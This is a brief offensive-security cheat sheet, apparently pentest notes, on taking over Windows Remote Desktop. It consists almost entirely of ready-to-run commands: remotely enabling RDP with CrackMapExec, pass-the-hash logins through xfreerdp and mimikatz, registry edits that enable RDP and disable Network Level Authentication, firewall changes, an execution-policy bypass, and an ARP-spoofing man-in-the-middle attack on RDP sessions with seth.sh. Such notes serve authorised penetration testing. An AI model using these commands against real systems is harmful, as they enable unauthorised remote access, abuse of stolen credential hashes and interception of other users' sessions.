Enabling RDP and tools to use for RDP

## Crackmapexec
```bash
# Remotely enable RDP using CrackMapExec
sudo crackmapexec smb 0.0.0.0 -u user -p password -M rdp -o ACTION=enable
```

```bash
# RDP through Pass-the-Hash
xfreerdp /u:USER /d:DOMAIN /pth:NTLM /v:server.domain.local
```

```bash
# RDP using mimikatz and PtH
sekurlsa::pth /user:user /domain:domain.local /ntlm:xxxxxxxxxxxxxxx /run:"mstsc.exe /restrictedadmin"
```

## cmd.exe
```bash
# Enable RDP from cmd.exe
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Disable RDP from cmd.exe
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f

# Disable NLA (Network Layer Authentication) requirement
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

# You can also do it through the firewall
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable
```

## Powershell
```bash
# Requires admin priv or able to run as sudo (using powershell sudo.ps1)
powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Username\AppData\Local\Temp\sudo_PS1-0.ps1; }"
```

## Main in The Middle (MiTM)
```bash
# You can try to attack existing RDP connections
# seth.sh is a great tool for that
# It performs an ARP spoofing attack
./seth.sh eth0 <IP attacker> <IP victim> <Gateway | Host>
```

